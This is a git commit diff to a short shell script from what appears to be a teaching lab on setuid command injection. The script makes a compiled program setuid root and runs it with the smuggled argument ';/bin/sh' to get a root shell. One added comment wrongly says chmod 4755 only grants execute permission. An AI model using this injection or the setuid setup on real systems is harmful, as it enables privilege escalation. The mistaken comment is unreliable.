69cfef4f3a44ca9830ef9bf218a88dacb3df2699
Jack <61994603+Fantastisity@users.noreply.github.com>
2022-03-19 18:28:41 +1100

    Update dangerous_invoke.sh

--- dangerous invoke/dangerous_invoke.sh
+++ dangerous invoke/dangerous_invoke.sh
@@ -2,7 +2,7 @@
 
 gcc -o dangerous_invoke dangerous_invoke.c
 sudo chown root dangerous_invoke
-sudo chmod 4755 dangerous_invoke
+sudo chmod 4755 dangerous_invoke    # only gives the executable permission
 ls -l dangerous_invoke
 
-./dangerous_invoke ";/bin/sh"
+./dangerous_invoke ";/bin/sh"       # the string after semicolon is an extra command to shell, and by invoking it, attack would gain full privileges 
